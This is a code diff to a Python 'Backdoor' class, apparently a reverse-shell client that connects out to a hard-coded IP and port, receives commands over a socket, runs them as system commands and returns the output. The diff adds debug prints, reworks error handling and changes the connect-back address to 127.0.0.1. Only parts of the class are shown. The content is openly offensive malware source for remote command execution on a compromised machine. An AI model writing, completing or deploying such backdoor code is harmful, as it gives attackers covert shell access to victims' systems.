@@ -18,17 +18,20 @@ class Backdoor:
         try:
             data = data.decode("utf-8")
         except:
+            print("[-] decode error")
             pass
 
         json_data = json.dumps(data)
         json_data = json_data.encode("utf-8")
         self.connection.send(json_data)
+        print(f"[+] rel send -> {data}")
 
     def reliable_receive(self):
         json_data = self.connection.recv(1024)
         json_data = json_data.decode("utf-8")
         command = json.loads(json_data)
         command = command.split(" ")
+        print(f"[+] rcv -> {command}")
         return command
 
     def change_directory_tool(self, path):
@@ -75,14 +78,15 @@ class Backdoor:
 
                 else:
                     command_result = self.execute_system_command(command)
-            except Exception:
-                command_result = "[-] Error during comand execution ::Client::"
 
                 self.reliable_send(command_result)
 
+            except Exception:
+                command_result = "[-] Error during comand execution ::Client::"
+                self.reliable_send(command_result)
 
 if __name__ == "__main__":
-    ip = "172.17.122.79"
+    ip = "127.0.0.1"
     port = 8080
 
     backdoor = Backdoor(ip, port)
